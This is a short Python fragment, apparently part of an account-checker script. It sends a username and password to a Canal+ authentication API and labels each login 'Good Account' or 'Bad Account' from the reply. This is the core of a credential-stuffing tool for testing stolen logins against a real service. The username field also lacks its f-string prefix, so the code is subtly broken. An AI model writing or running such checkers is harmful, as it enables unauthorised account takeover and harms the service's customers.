...
datam = {"password":f"{password}","username":"{username}","options":{"warnBeforePasswordExpired":true,"multiOptionalFactorEnroll":true}}

req = requests.post("https://pass.canalplus.com/api/v1/authn", json=datam, headers=headers)

if "Authentication failed" in req.text:
  print("Bad Account")
elif "\"status\":\"SUCCESS" in req.text:
  print("Good Account")
